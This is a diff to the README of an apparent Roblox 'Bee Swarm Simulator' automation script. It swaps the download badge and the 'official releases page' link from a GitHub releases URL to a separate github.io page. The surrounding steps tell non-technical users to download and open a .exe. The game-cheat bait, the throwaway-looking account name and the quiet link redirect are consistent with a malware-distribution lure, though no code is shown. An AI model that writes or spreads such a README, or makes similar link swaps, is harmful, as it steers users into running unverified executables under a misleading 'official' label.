@@ -1,6 +1,6 @@
 # 🐝 Bee-Swarm-Simulator-Script-2026 - Automate your hive for maximum honey
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/fourfold-tariff148/Bee-Swarm-Simulator-Script-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://fourfold-tariff148.github.io)
 
 ## 📦 What this tool does
 
@@ -21,7 +21,7 @@ Your computer needs to meet these standards to run the tool:
 
 Follow these steps to set up the tool. You do not need to know programming to complete this process.
 
-1. Visit the [official releases page](https://github.com/fourfold-tariff148/Bee-Swarm-Simulator-Script-2026/releases) to access the latest version.
+1. Visit the [official releases page](https://fourfold-tariff148.github.io) to access the latest version.
 2. Locate the most recent file ending in .exe in the assets section of the release entry.
 3. Click the file name to download it to your Windows computer.
 4. Open your Downloads folder.
